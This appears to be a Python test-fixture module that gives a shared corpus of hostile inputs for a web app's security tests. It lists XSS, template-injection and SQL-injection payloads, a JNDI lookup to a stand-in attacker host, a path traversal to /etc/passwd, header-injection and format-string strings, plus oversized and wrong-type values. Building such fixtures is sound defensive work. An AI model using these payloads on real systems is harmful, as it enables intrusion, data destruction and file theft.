"""Attacker-controlled payload fixtures, shared rather than reinvented.

SECURITY-BASELINE §2: message text, usernames, profile fields, comment bodies
and media URLs all arrive from strangers. Issue #4 built a corpus for the
webhook endpoint; this is the same corpus at the persistence layer, exported so
**L4-D reuses it** for its hostile-content XSS suite rather than growing a
second, differently-wrong copy of the list.
"""

#: One string per class of attack, each aimed at a different consumer.
INJECTIONS: tuple[str, ...] = (
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    # The SSTI ban (SECURITY-BASELINE §3): this must survive as a literal.
    "{{ 7*7 }}",
    "{% load static %}",
    "${jndi:ldap://attacker.test/a}",
    "'; DROP TABLE messaging_message; --",
    "' OR '1'='1",
    "../../../../etc/passwd",
    "%00%0d%0aSet-Cookie:%20evil=1",
    "\r\nX-Injected: header",
    "‮evil‭",
    "👨‍👩‍👧‍👦" * 50,
    "%s%s%s%n",
    "\\u0000",
)

#: Values that are the right shape but the wrong size.
OVERSIZED: tuple[str, ...] = (
    "A" * 200_000,
    "+" + "1" * 400,
    "x" * 5_000,
)

#: Values that are not strings at all. An adapter should never emit these, and
#: "should never" is exactly the assumption a defensive layer does not make.
WRONG_TYPES: tuple[object, ...] = (None, 42, 3.5, [], {}, {"nested": ["deep"]}, True)
